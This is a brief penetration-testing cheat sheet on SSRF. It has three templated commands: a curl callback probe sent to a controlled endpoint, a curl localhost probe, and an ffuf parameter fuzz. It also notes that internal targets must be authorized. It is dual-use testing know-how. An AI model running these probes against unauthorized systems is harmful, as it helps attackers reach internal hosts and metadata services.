---
technique: SSRF Testing
category: injection
targets: Web Applications, APIs
protocols: HTTP, HTTPS
remote_capable: true
tags: web ssrf injection
---

# SSRF Testing

SSRF testing checks whether server-side URL fetchers can reach internal hosts, metadata services, or controlled callback endpoints.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| URL parameter | Requires an input that accepts URLs or hostnames |
| Callback | Blind SSRF benefits from a controlled callback endpoint |
| Scope | Internal targets must be authorized |

## Linux

### Callback probe

#sh #curl #ssrf

Send a callback URL through a suspected fetch parameter.

```sh title:"Send SSRF callback probe"
curl -sk "$url?$param=$callback_url"
```
<!-- cheat
var url
var param
var callback_url
-->

### Localhost probe

#sh #curl #ssrf

Test a localhost URL through a suspected fetch parameter.

```sh title:"Send SSRF localhost probe"
curl -sk "$url?$param=http://127.0.0.1:$port/"
```
<!-- cheat
var url
var param
var port
-->

### Parameter fuzz

#sh #ffuf #ssrf

Fuzz URL-like values into a suspected fetch parameter.

```sh title:"Fuzz SSRF parameter values"
ffuf -w "$wordlist" -u "$url?$param=FUZZ" -ac -o "$outfile"
```
<!-- cheat
var wordlist
var url
var param
var outfile
-->
